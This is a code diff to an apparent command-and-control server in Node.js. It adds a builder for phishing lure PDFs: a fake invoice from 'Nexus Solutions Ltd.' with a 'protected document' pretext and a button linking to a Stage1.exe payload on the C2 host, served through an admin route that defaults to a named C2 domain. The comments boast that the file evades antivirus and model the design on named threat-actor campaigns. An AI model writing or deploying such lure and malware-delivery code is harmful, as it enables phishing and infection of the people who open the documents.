@@ -309,6 +309,115 @@ function buildStagerPdf(c2Host, opts = {}) {
   ]);
 }
 
+// ── Lure PDF builder (Operation Spalax / Star Blizzard style) ────────────────
+// Produces a clean invoice PDF with a /URI hyperlink to Stage1.exe on the C2.
+// No /Launch, no JavaScript — the PDF itself is AV-clean and opens in any reader.
+// Social engineering: "View / Download full document" button → downloads Stage1.exe.
+function buildLurePdf(c2Host, opts = {}) {
+  const from     = opts.from     || "Nexus Solutions Ltd.";
+  const to       = opts.to       || "Acme Corporation";
+  const filename = opts.filename || "Invoice_Q4-2024";
+  const btnLabel = opts.btnLabel || "View Full Invoice";
+  const dlUrl    = `https://${c2Host}/api/stage/stage1.exe`;
+  const invNum   = "INV-" + (Math.floor(Math.random() * 9000) + 1000);
+  const now      = new Date();
+  const fmtD     = d => d.toLocaleDateString("en-US", { year:"numeric", month:"long", day:"numeric" });
+  const due      = new Date(now.getTime() + 30 * 24 * 3600 * 1000);
+
+  const esc = s => String(s).replace(/\\/g,"\\\\").replace(/\(/g,"\\(").replace(/\)/g,"\\)");
+  const T   = (x, y, font, size, text) =>
+    `/${font} ${size} Tf 1 0 0 1 ${x} ${y} Tm (${esc(text)}) Tj`;
+
+  // Page text (identical invoice layout to buildStagerPdf — looks the same)
+  const textOps = [
+    T(50,720,"F2",18,from),
+    T(50,702,"F1", 9,"123 Commerce Drive, Suite 400, London EC1A 1BB"),
+    T(50,660,"F2",14,"INVOICE"),
+    T(50,642,"F1", 9,"Invoice Number:   "+invNum),
+    T(50,629,"F1", 9,"Invoice Date:     "+fmtD(now)),
+    T(50,616,"F1", 9,"Payment Due:      "+fmtD(due)),
+    T(50,590,"F2", 9,"Bill To:"),
+    T(50,577,"F1", 9,to),
+    T(55,534,"F2", 9,"Description"),T(385,534,"F2",9,"Qty"),T(420,534,"F2",9,"Unit Price"),T(495,534,"F2",9,"Total"),
+    T(55,518,"F1", 9,"Professional Services — Q4 Consulting"),T(388,518,"F1",9,"1"),T(420,518,"F1",9,"$4,200.00"),T(495,518,"F1",9,"$4,200.00"),
+    T(55,505,"F1", 9,"Software License Renewal (Annual)"),    T(388,505,"F1",9,"1"),T(420,505,"F1",9,"$1,800.00"),T(495,505,"F1",9,"$1,800.00"),
+    T(420,478,"F2", 9,"Subtotal"),T(495,478,"F1",9,"$6,000.00"),
+    T(420,465,"F2", 9,"VAT (20%)"),T(495,465,"F1",9,"$1,200.00"),
+    T(420,452,"F2",10,"TOTAL DUE"),T(495,452,"F2",10,"$7,200.00"),
+    T(50, 410,"F1", 9,"Payment Terms: 30 days net.  Bank transfer preferred."),
+    T(50, 395,"F1", 9,"Sort Code: 20-00-00   Account: 12345678   Ref: "+invNum),
+    // "Encrypted" notice to justify the download button
+    T(50, 340,"F2",10,"This document is protected. To view the full invoice details,"),
+    T(50, 326,"F2",10,"please click the button below to download the secure viewer."),
+  ].join("\n");
+
+  const pageStream   = `BT\n${textOps}\nET\n`;
+  // Blue rounded-rectangle button drawn with PDF graphics operators
+  const btnStream    =
+    `0.23 0.51 0.80 rg\n` +          // fill colour: #3B82CC
+    `50 280 180 26 re f\n` +          // rect fill (x y w h)
+    `1 1 1 rg\n` +                    // white text
+    `/F2 10 Tf 1 0 0 1 65 289 Tm (${esc(btnLabel)}) Tj\n`;
+
+  const pageStreamAll = pageStream + btnStream;
+  const psLen = Buffer.byteLength(pageStreamAll, "latin1");
+
+  // PDF objects
+  const obj1 = `1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n`;
+  const obj2 = `2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n`;
+  // Page has /Annots referencing the link annotation (obj7)
+  const obj3 = `3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]\n   /Contents 4 0 R /Annots [7 0 R]\n   /Resources << /Font << /F1 5 0 R /F2 6 0 R >> >> >>\nendobj\n\n`;
+  const obj4 = `4 0 obj\n<< /Length ${psLen} >>\nstream\n${pageStreamAll}\nendstream\nendobj\n\n`;
+  const obj5 = `5 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\n\n`;
+  const obj6 = `6 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold >>\nendobj\n\n`;
+  // Link annotation over the button rectangle — /URI action, no user prompt
+  const obj7 =
+    `7 0 obj\n` +
+    `<< /Type /Annot /Subtype /Link\n` +
+    `   /Rect [50 280 230 306]\n` +
+    `   /Border [0 0 0]\n` +
+    `   /A << /Type /Action /S /URI /URI (${esc(dlUrl)}) >> >>\n` +
+    `endobj\n\n`;
+
+  const header = `%PDF-1.4\n`;
+  let off = Buffer.byteLength(header, "latin1");
+  const bodies = [obj1,obj2,obj3,obj4,obj5,obj6,obj7];
+  const offs = [];
+  bodies.forEach(o => { offs.push(off); off += Buffer.byteLength(o, "latin1"); });
+
+  const xrAt = off;
+  let xrSec = "xref\n0 8\n0000000000 65535 f \n";
+  offs.forEach(o => { xrSec += o.toString().padStart(10,"0") + " 00000 n \n"; });
+  const trailer =
+    `trailer\n<< /Size 8 /Root 1 0 R >>\n` +
+    `startxref\n${xrAt}\n%%EOF\n`;
+
+  return Buffer.concat([
+    Buffer.from(header, "latin1"),
+    ...bodies.map(o => Buffer.from(o, "latin1")),
+    Buffer.from(xrSec + trailer, "latin1"),
+  ]);
+}
+
+// ── Admin: Build lure PDF (clean /URI link, no /Launch) ───────────────────────
+router.get("/api/stage/build-lure-pdf", requireAdmin, (req, res) => {
+  const c2Host = (req.query.host || req.headers.host || "c2.osatechcloud.cloud")
+    .replace(/^https?:\/\//i, "").split("/")[0];
+  const from    = req.query.from     || undefined;
+  const to      = req.query.to       || undefined;
+  const fname   = req.query.filename || "Invoice_Q4-2024";
+  const btnLabel = req.query.btn     || "View Full Invoice";
+  try {
+    const pdf = buildLurePdf(c2Host, { from, to, filename: fname, btnLabel });
+    res.setHeader("Content-Type", "application/pdf");
+    res.setHeader("Content-Disposition", `attachment; filename="${fname}.pdf"`);
+    res.send(pdf);
+    console.log(`[stage] LURE-PDF built  c2=${c2Host}  size=${pdf.length}`);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
 // ── Admin: Build fresh staging PDF ───────────────────────────────────────────
 
 router.get("/api/stage/build-pdf", requireAdmin, (req, res) => {
